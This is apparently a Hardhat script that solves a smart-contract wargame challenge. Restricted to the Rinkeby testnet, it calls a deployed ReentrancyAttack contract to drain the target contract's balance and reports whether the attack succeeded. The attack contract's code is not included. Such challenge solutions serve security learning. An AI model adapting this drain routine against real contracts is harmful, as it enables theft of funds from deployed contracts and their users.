import "@ethersproject/abstract-provider"
import { deployments, ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const reentranceExploitDeployment=await deployments.get('ReentrancyAttack')
        const reentranceExploit = await ethers.getContractAt('ReentrancyAttack',reentranceExploitDeployment.address)
        const reentranceContract= await ethers.getContractAt('Telephone',process.env.REENTRANCE_ADDRESS as string)
        
        const reentranceBalance= await ethers.provider.getBalance(reentranceContract.address)
        const defaultAmountAttack=ethers.utils.parseEther("0.1")
        const amountAttack = reentranceBalance.lt(defaultAmountAttack)?reentranceBalance:defaultAmountAttack


        const transaction=await reentranceExploit.connect(exploiterAcc).exploitReentrance({
            value: amountAttack,
            gasPrice: (await ethers.provider.getGasPrice()).mul(3)
        });
        console.log(transaction.hash)
        await transaction.wait()

        if((await ethers.provider.getBalance(reentranceContract.address)).eq(0)){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
